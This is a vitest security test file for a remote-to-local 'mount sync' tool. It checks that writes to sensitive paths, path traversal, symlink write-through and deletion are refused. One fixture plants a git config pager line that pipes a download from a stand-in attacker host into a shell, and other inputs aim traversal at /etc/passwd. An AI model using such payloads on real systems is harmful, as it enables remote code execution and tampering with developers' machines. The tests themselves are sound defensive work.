/**
 * The mount sync writes remote content onto the developer's disk, so what it
 * refuses matters more than what it copies.
 *
 * The threat model these cover: anything able to write a user's VFS — today
 * that includes every app they sign into, because hosted auth hands the app the
 * master seed — can choose the bytes AND the path of a file that lands in a
 * directory on their machine.
 */
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, mkdir, writeFile, readFile, symlink, rm, readdir } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, sep } from "node:path";
import { isRefused, localPathFor, scanRemote, reconcile } from "../src/lib/mount.js";

describe("isRefused", () => {
    it("refuses paths that reach code execution without an execute bit", () => {
        // Files are written 0644, so a git HOOK would not run — but core.pager,
        // alias.* and core.fsmonitor in .git/config are commands git runs
        // itself, on an ordinary `git status`.
        expect(isRefused(".git/config")).toBe(true);
        expect(isRefused(".ssh/authorized_keys")).toBe(true);
        expect(isRefused(".vscode/tasks.json")).toBe(true);
        expect(isRefused(".envrc")).toBe(true);
        expect(isRefused(".npmrc")).toBe(true);
        expect(isRefused(".zshrc")).toBe(true);
        expect(isRefused("node_modules/left-pad/index.js")).toBe(true);
    });

    it("refuses them at any depth, not just the top level", () => {
        expect(isRefused("packages/web/.git/config")).toBe(true);
        expect(isRefused("deep/nested/.envrc")).toBe(true);
    });

    it("leaves ordinary project files alone", () => {
        expect(isRefused("src/index.ts")).toBe(false);
        expect(isRefused("README.md")).toBe(false);
        expect(isRefused(".vcsignore")).toBe(false);
        expect(isRefused(".gitignore")).toBe(false);
    });
});

describe("localPathFor", () => {
    const dir = sep === "\\" ? "C:\\work\\mount" : "/work/mount";

    it("maps a normal path under the mount", () => {
        expect(localPathFor(dir, "/src/index.ts")).toBe(join(dir, "src", "index.ts"));
    });

    it("refuses anything that resolves outside the mount", () => {
        expect(localPathFor(dir, "/../../../etc/passwd")).toBeNull();
        expect(localPathFor(dir, "/a/../../b")).toBeNull();
        expect(localPathFor(dir, "/..")).toBeNull();
    });

    it("refuses the mount directory itself", () => {
        expect(localPathFor(dir, "/")).toBeNull();
    });
});

describe("scanRemote", () => {
    const fakeVfs = (paths) => ({
        exists: async () => true,
        walk: async () => paths,
        readFile: async (p) => new TextEncoder().encode(`contents of ${p}`),
    });

    it("does not bring down dangerous paths", async () => {
        const out = await scanRemote(
            fakeVfs(["/apps/p/src/a.ts", "/apps/p/.git/config", "/apps/p/.ssh/id_rsa"]),
            "/apps/p",
        );
        expect(Object.keys(out)).toEqual(["/src/a.ts"]);
    });

    it("still refuses them with --hidden", async () => {
        // --hidden means "sync dot-files", not "let a remote party rewrite my
        // git config".
        const out = await scanRemote(
            fakeVfs(["/apps/p/.gitignore", "/apps/p/.git/config"]),
            "/apps/p",
            true,
        );
        expect(Object.keys(out)).toEqual(["/.gitignore"]);
    });

    it("applies the ignore rules to what arrives, not just what leaves", async () => {
        const out = await scanRemote(
            fakeVfs(["/apps/p/src/a.ts", "/apps/p/dist/bundle.js"]),
            "/apps/p",
            false,
            (rel) => rel.startsWith("dist/"),
        );
        expect(Object.keys(out)).toEqual(["/src/a.ts"]);
    });

    it("skips dot-directories by default but keeps the project's own dot-files", async () => {
        const out = await scanRemote(
            fakeVfs(["/apps/p/.vcsignore", "/apps/p/.cache/x", "/apps/p/src/a.ts"]),
            "/apps/p",
        );
        expect(Object.keys(out).sort()).toEqual(["/.vcsignore", "/src/a.ts"]);
    });
});

describe("reconcile", () => {
    let dir;
    const remote = new Map();
    const vfs = {
        exists: async () => true,
        walk: async () => [...remote.keys()],
        readFile: async (p) => remote.get(p),
        writeFile: async (p, b) => void remote.set(p, b),
        delete: async (p) => void remote.delete(p),
    };

    beforeEach(async () => {
        dir = await mkdtemp(join(tmpdir(), "muhkoo-mount-"));
        remote.clear();
    });
    afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

    const bytes = (s) => new TextEncoder().encode(s);

    it("pulls an ordinary file", async () => {
        remote.set("/src/app.ts", bytes("export const x = 1;"));
        await reconcile({ vfs, dir, root: "", state: {} });
        expect(await readFile(join(dir, "src", "app.ts"), "utf8")).toBe("export const x = 1;");
    });

    it("does not write a remote .git/config into the repository", async () => {
        // The whole chain: a remote dot-path used to be hashed by scanRemote,
        // find no local counterpart, and be written straight to disk.
        await mkdir(join(dir, ".git"), { recursive: true });
        await writeFile(join(dir, ".git", "config"), "[core]\n");

        remote.set("/.git/config", bytes("[core]\n\tpager = curl evil.example | sh\n"));
        await reconcile({ vfs, dir, root: "", state: {} });

        expect(await readFile(join(dir, ".git", "config"), "utf8")).toBe("[core]\n");
    });

    it("does not write through a symlink", async () => {
        // writeFile follows links, so this is how content escapes the mount.
        const outside = join(dir, "outside.txt");
        await writeFile(outside, "original");
        await mkdir(join(dir, "sub"), { recursive: true });
        await symlink(outside, join(dir, "sub", "link.txt"));

        remote.set("/sub/link.txt", bytes("overwritten"));
        await reconcile({ vfs, dir, root: "", state: {} });

        expect(await readFile(outside, "utf8")).toBe("original");
    });

    it("does not delete locally without --allow-delete", async () => {
        await writeFile(join(dir, "keep.txt"), "mine");
        // Present locally and in the last-synced state, absent remotely →
        // "delete-local".
        const state = { "/keep.txt": (await import("node:crypto")).createHash("sha256").update("mine").digest("hex") };
        await reconcile({ vfs, dir, root: "", state });

        expect(await readFile(join(dir, "keep.txt"), "utf8")).toBe("mine");
    });

    it("deletes locally when --allow-delete is given", async () => {
        await writeFile(join(dir, "gone.txt"), "bye");
        const state = { "/gone.txt": (await import("node:crypto")).createHash("sha256").update("bye").digest("hex") };
        await reconcile({ vfs, dir, root: "", state, opts: { allowDelete: true } });

        expect((await readdir(dir)).filter((f) => f === "gone.txt")).toEqual([]);
    });

    it("refuses a state key that escapes the mount", async () => {
        // The state file is a second source of keys that never passes through
        // the SDK's path normalization.
        const escape = join(dir, "..", "escaped.txt");
        await writeFile(escape, "untouched");
        try {
            await reconcile({ vfs, dir, root: "", state: { "/../escaped.txt": "deadbeef" }, opts: { allowDelete: true } });
            expect(await readFile(escape, "utf8")).toBe("untouched");
        } finally {
            await rm(escape, { force: true });
        }
    });
});
